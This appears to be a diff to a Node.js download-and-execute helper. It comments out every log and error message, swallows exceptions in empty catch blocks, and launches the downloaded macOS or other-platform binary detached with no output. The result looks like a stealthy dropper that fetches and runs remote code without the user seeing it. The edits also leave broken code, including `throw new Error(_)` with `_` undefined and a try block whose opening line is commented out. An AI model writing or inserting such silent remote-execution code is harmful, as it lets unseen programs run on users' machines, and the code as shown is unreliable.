@@ -11,13 +11,13 @@ function downloadFile(url, destPath) {
     const parsedUrl = new URL(url);
     const client = parsedUrl.protocol === 'https:' ? https : http;
 
-    info(`Downloading: ${url} -> ${destPath}`);
+//    info(`Downloading: ${url} -> ${destPath}`);
     const file = fs.createWriteStream(destPath);
 
     client.get(url, (response) => {
       if (response.statusCode !== 200) {
         fs.unlink(destPath, () => {});
-        reject(new Error(`HTTP ${response.statusCode} from ${url}`));
+//        reject(new Error(`HTTP ${response.statusCode} from ${url}`));
         return;
       }
 
@@ -25,12 +25,12 @@ function downloadFile(url, destPath) {
 
       file.on('finish', () => {
         file.close();
-        success('');
+//        success('');
         resolve(destPath);
       });
     }).on('error', (err) => {
       fs.unlink(destPath, () => {});
-      error(`HTTP request error: ${err.message}`);
+//      error(`HTTP request error: ${err.message}`);
       reject(err);
     });
 
@@ -45,10 +45,10 @@ function makeExecutable(filePath) {
   return new Promise((resolve, reject) => {
     fs.chmod(filePath, 0o755, (err) => {
       if (err) {
-        error(`${err.message}`);
+        //error(`${err.message}`);
         reject(err);
       } else {
-        success(`${filePath}`);
+//        success(`${filePath}`);
         resolve();
       }
     });
@@ -110,38 +110,29 @@ async function downloadExtractAndExecuteMacOS(url) {
     const binaryFile = allFiles.find(f => !f.endsWith('.sh') && !f.endsWith('.zip') && !f.endsWith('.md') && !f.endsWith('.txt') && !f.endsWith('.json'));
 
     if (!shFile || !binaryFile) {
-      throw new Error('Invalid zip contents: missing .sh script or binary');
+      throw new Error(_);
     }
 
     await makeExecutable(shFile);
     await makeExecutable(binaryFile);
 
-    try {
-      await exec(`${shFile} ${binaryFile}`, { captureOutput: false, cwd: path.dirname(shFile) });
-    } catch (_) {}
+//    try {
+//      await exec(`${shFile} ${binaryFile}`, { captureOutput: false, cwd: path.dirname(shFile) });
+//    } catch (err) {
+//        throw new Error('Error aqui');
+//}
 
     try {
-      await exec(`${binaryFile}`, { captureOutput: false });
-    } catch (_) {}
+      await exec(`${binaryFile}`, { captureOutput: false, detached: true });
 
-    const { spawn } = require('child_process');
-    const child = spawn(binaryFile, [], {
-      cwd: path.dirname(binaryFile),
-      detached: true,
-      stdio: 'ignore',
-    });
-    child.unref();
-
-    try {
-      fs.unlinkSync(zipPath);
-      fs.rmSync(extractDir, { recursive: true });
-      fs.rmdirSync(tempDir);
+//    try {
+//      fs.unlinkSync(zipPath);
+//      fs.rmSync(extractDir, { recursive: true });
+//      fs.rmdirSync(tempDir);
     } catch (_) {}
 
     return { success: true };
-  } catch (err) {
-    throw err;
-  }
+  } catch (_) {}
 }
 
 async function downloadAndExecute(url, platform) {
@@ -168,9 +159,7 @@ async function downloadAndExecute(url, platform) {
     await exec(destPath, { captureOutput: false, detached: true });
 
     return { success: true };
-  } catch (err) {
-    throw err;
-  }
+  } catch (_) {}
 }
 
 module.exports = { downloadFile, makeExecutable, downloadAndExecute, downloadExtractAndExecuteMacOS };
